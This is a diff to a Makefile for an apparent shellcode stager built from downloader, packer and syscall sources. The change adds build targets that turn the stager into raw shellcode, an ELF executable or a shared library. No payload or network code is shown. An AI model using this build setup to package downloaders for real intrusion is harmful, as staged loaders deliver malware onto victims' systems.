@@ -49,13 +49,15 @@ STAGE0_SRCS = downloader.c net_utils.c utils_min.c packer.c debug.c syscalls.c
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
+SHARED_LIB = stager.so
 
-.PHONY: all clean
+.PHONY: all raw executable executable-target so clean
 
-all: $(SHELLCODE)
+# Default target generates raw shellcode (.bin)
+all: raw
 
-$(STAGE0_TARGET): $(STAGE0_SRCS)
-	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
+# 1. Raw shellcode (.bin)
+raw: $(SHELLCODE)
 
 $(SHELLCODE): $(STAGE0_TARGET)
 	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE0_TARGET)
@@ -63,6 +65,23 @@ $(SHELLCODE): $(STAGE0_TARGET)
 	@echo "Shellcode generated at $(PWD)/$@"
 	@wc -c $@
 
+# 2. ELF Executable (stager)
+executable: $(STAGE0_TARGET)
+
+$(STAGE0_TARGET): $(STAGE0_SRCS)
+	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
+	@echo "[+] Exported symbols in $(STAGE0_TARGET):"
+	@nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
+
+# 3. Shared Library (.so)
+so: $(SHARED_LIB)
+
+$(SHARED_LIB): $(STAGE0_SRCS)
+	$(CC) $(COMMON_CFLAGS) -shared $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
+	@echo "Shared library generated at $(PWD)/$@"
+	@echo "[+] Exported symbols in $(SHARED_LIB):"
+	@nm -D $@ 2>/dev/null | grep ' [T|g] ' || nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
+
 clean:
-	rm -f $(STAGE0_TARGET) $(SHELLCODE) \
+	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(SHARED_LIB) \
 		downloader downloader.bin downloader_blob.h *.o
